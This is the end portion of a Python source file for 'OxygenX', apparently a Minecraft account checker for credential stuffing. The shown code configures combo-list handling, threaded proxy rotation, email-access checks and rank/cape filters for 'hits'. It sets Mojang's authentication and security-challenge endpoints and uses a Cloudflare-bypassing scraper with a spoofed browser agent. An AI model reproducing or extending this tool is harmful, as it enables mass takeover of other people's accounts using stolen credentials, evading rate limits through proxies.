            sleep(5)
            clear()
    except:
        if OxygenX.debug:
            print(f"{red} Error while checking for updates: \n{format_exc(limit=1)}\n")


class OxygenX:
    version_check = bool(settings['OxygenX']['check_for_updates'])
    retries = int(settings['OxygenX']['retries'])
    timeout = int(settings['OxygenX']['timeout']) / 1000
    threads = int(settings['OxygenX']['threads'])
    combo_dup = bool(settings['OxygenX']['combo_duplicates'])
    proxy_dup = bool(settings['OxygenX']['proxy_duplicates'])
    emailaccess = bool(settings['OxygenX']['mail_access'])
    ranktype = bool(settings['OxygenX']['save_ranked_type'])
    print_bad = bool(settings['OxygenX']['print_bad'])
    save_bad = bool(settings['OxygenX']['save_bad'])
    debug = bool(settings['OxygenX']['debugging'])

    class Cape:
        lb = bool(settings['OxygenX']['capes']['liquidbounce'])
        optifine = bool(settings['OxygenX']['capes']['optifine'])
        laby = bool(settings['OxygenX']['capes']['labymod'])
        mojang = bool(settings['OxygenX']['capes']['mojang'])

    class Rank:
        mineplex = bool(settings['OxygenX']['rank']['mineplex'])
        hypixel = bool(settings['OxygenX']['rank']['hypixel'])
        hivemc = bool(settings['OxygenX']['rank']['hivemc'])
        veltpvp = bool(settings['OxygenX']['rank']['veltpvp'])

    class Level:
        hypixel = bool(settings['OxygenX']['level']['hypixel'])
        mineplex = bool(settings['OxygenX']['level']['mineplex'])
        hypixel_level = int(settings['OxygenX']['level']['hypixel_level'])
        mineplex_level = int(settings['OxygenX']['level']['mineplex_level'])

    class Proxy:
        proxy = bool(settings['OxygenX']['proxy']['proxy'])
        type = str(settings['OxygenX']['proxy']['proxy_type']).lower()
        lock_proxy = bool(settings['OxygenX']['proxy']['lock_proxy'])
        remove_bad_proxy = bool(settings['OxygenX']['proxy']['remove_bad_proxy'])
        proxy_remove_limit = int(settings['OxygenX']['proxy']['proxy_remove_limit']) + 1
        sfa_proxy = bool(settings['OxygenX']['proxy']['proxy_for_sfa'])
        sleep = int(settings['OxygenX']['proxy']['sleep_proxyless'])

        class API:
            use = bool(settings['OxygenX']['proxy']['api']['use'])
            api = str(settings['OxygenX']['proxy']['api']['api_link'])
            refresh = int(settings['OxygenX']['proxy']['api']['refresh_time'])


if __name__ == '__main__':
    clear = lambda: system('cls' if name == 'nt' else 'clear')
    init()
    session = Session()
    lock = Lock()
    veltrankz = compile(r'<h2 style=\"color: .*\">(.*)</h2>')
    rankhv = compile(r'class=\"rank.*\">(.*)<')
    levelmp = compile(r'>Level (.*)</b>')
    rankmp = compile(r'class=\"www-mp-rank\".*>(.*)</span>')
    yellow = Fore.LIGHTYELLOW_EX
    red = Fore.LIGHTRED_EX
    green = Fore.LIGHTGREEN_EX
    cyan = Fore.LIGHTCYAN_EX
    blue = Fore.LIGHTBLUE_EX
    white = Fore.LIGHTWHITE_EX
    magenta = Fore.LIGHTMAGENTA_EX
    agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36'
    scraper = create_scraper(sess=Session(), browser={'custom': agent})
    mailheaders = {'user-agent': agent}
    jsonheaders = {"Content-Type": "application/json", 'Pragma': 'no-cache'}
    user_url = 'https://api.mojang.com/profiles/minecraft'
    auth_mc = 'https://authserver.mojang.com/authenticate'
    sfa_url = 'https://api.mojang.com/user/security/challenges'
    charz = ['@', '!', '#', '$', '%', '^', '&', '*', ')', '(', '-', '}', '{', ']', '"', '+', '=', '?', '/',
             '.', '>', ',', '<', '`', '\'', '~', '[', '\\', ' ']
    version = '0.8'
    set_title(f'OxygenX-{version} | by ShadowOxygen')
    t = f'''{cyan}________                                     ____  ___
\_____  \ ___  ______.__. ____   ____   ____ \   \/  /
 /   |   \\\  \/  <   |  |/ ___\_/ __ \ /    \ \     /
/    |    \>    < \___  / /_/  >  ___/|   |  \/     \\
\_______  /__/\_ \/ ____\___  / \___  >___|  /___/\  \\
        \/      \/\/   /_____/      \/     \/      \_/
\n'''

    if OxygenX.version_check:
        checkforupdates()
    Main()
